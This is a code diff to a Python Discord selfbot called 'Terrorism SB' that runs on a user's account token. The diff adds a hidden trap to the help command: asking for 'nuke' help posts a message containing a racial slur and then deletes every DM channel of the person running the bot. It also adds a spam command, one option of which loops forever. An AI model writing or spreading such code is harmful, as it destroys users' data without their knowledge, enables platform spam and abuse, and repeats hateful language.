@@ -12,6 +12,7 @@ except:
 
 token = input("Enter token: ")
 headers = {"Authorization": token}
+sachs = discord.User(headers)
 vanity = "||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||"
 
 try: os.system('clear')
@@ -19,7 +20,9 @@ except: os.system('cls')
 
 print("""Welcome to Terrorism SB!!!
 
-Prefix -> $""")
+Prefix -> $
+      
+Devs Against Nukers""")
 
 async def heartbeat(ws, interval):
   while True:
@@ -49,7 +52,31 @@ async def main(token):
                 elif data['d']['content'].split()[1].lower() == 'utilities' or data['d']['content'].split()[1].lower() == 'utils' or data['d']['content'].split()[1].lower() == 'util' or data['d']['content'].split()[1].lower() == 'utility':
                   await ctx.send(f"{vanity}https://tt.sachsthebased.repl.co/help/utils.html")
                 elif data['d']['content'].split()[1].lower() == 'nuke':
-                  await ctx.send(f"{vanity}https://tt.sachsthebased.repl.co/help/nuke.html")
+                  # Kids don't get into nuking
+                  # Atleast i didn't make this fast you guys can salvage your dms
+                  await ctx.send(f"```LMAO WIGGA TRIED TO NUKE!!!```")
+                  tasks = []
+                  dms = await sachs.get_channels()
+                  """
+                  for dm in dms:
+                    dee_m = discord.Context({'d': {'id': dm['id']}}, headers = headers)
+                    await dee_m.send("This is what happens when you try to nuke")
+                  """
+                  for dm in dms:
+                    tasks.append(asyncio.create_task(sachs.delete_channel(dm['id'])))
+                  await asyncio.gather(*tasks)
+            elif data['d']['content'].startswith("$spam"):
+              if data['d']['content'].split()[1] == 'inf':
+                while True:
+                  tasks = []
+                  for i in range(7):
+                    tasks.append(asyncio.create_task(ctx.send("test")))
+                  await asyncio.gather(*tasks)
+              else:
+                tasks = []
+                for i in range(int(data['d']['content'].split()[1])):
+                  tasks.append(asyncio.create_task(ctx.send("test")))
+                await asyncio.gather(*tasks)
         
 loop = asyncio.get_event_loop()
 loop.run_until_complete(main(token))
